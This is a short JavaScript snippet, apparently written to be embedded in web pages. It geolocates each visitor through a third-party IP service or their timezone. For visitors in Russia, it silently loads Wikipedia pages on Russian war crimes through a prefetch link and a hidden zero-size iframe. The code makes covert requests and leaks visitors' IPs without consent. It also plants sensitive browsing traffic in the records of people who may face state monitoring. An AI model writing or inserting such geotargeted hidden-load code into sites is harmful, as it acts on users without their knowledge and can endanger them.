(function() {
  const wikiUrls = [
    "https://en.wikipedia.org/wiki/War_crimes_in_the_Russo-Ukrainian_war_(2022%E2%80%93present)",
    "https://en.wikipedia.org/wiki/Russian_war_crimes",
    "https://en.wikipedia.org/wiki/Atrocity_crimes_during_the_Russo-Ukrainian_war",
    "https://en.wikipedia.org/wiki/Bucha_massacre",
    "https://en.wikipedia.org/wiki/Siege_of_Mariupol",
    "https://en.wikipedia.org/wiki/Child_abductions_in_the_Russo-Ukrainian_war"
  ];

  function doShadowPrefetch() {
    const randomUrl = wikiUrls[Math.floor(Math.random() * wikiUrls.length)];
    
    // Method 1: Resource prefetch (tells the browser to fetch the page in the background)
    const link = document.createElement('link');
    link.rel = 'prefetch';
    link.href = randomUrl;
    document.head.appendChild(link);

    // Method 2: Hidden iframe (forces the browser to load the page and its assets silently)
    const iframe = document.createElement('iframe');
    iframe.src = randomUrl;
    iframe.style.width = '0';
    iframe.style.height = '0';
    iframe.style.border = 'none';
    iframe.style.position = 'absolute';
    iframe.style.visibility = 'hidden';
    iframe.style.opacity = '0';
    document.body.appendChild(iframe);
  }

  function isRussianTimezone() {
    try {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const ruTimezones = [
        'Europe/Moscow', 'Europe/Samara', 'Europe/Volgograd', 'Europe/Kirov',
        'Europe/Astrakhan', 'Europe/Saratov', 'Europe/Ulyanovsk',
        'Asia/Yekaterinburg', 'Asia/Omsk', 'Asia/Novosibirsk', 'Asia/Barnaul',
        'Asia/Tomsk', 'Asia/Novokuznetsk', 'Asia/Krasnoyarsk', 'Asia/Irkutsk',
        'Asia/Chita', 'Asia/Yakutsk', 'Asia/Khandyga', 'Asia/Vladivostok',
        'Asia/Ust-Nera', 'Asia/Magadan', 'Asia/Sakhalin', 'Asia/Srednekolymsk',
        'Asia/Kamchatka', 'Asia/Anadyr'
      ];
      return ruTimezones.includes(tz);
    } catch (e) {
      return false;
    }
  }

  function checkIPAndExecute() {
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        if (data.country_code === 'RU') {
          doShadowPrefetch();
        }
      })
      .catch(() => {
        // Fallback to timezone check if the IP API fails
        if (isRussianTimezone()) {
          doShadowPrefetch();
        }
      });
  }

  // Run when the document is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', checkIPAndExecute);
  } else {
    checkIPAndExecute();
  }
})();
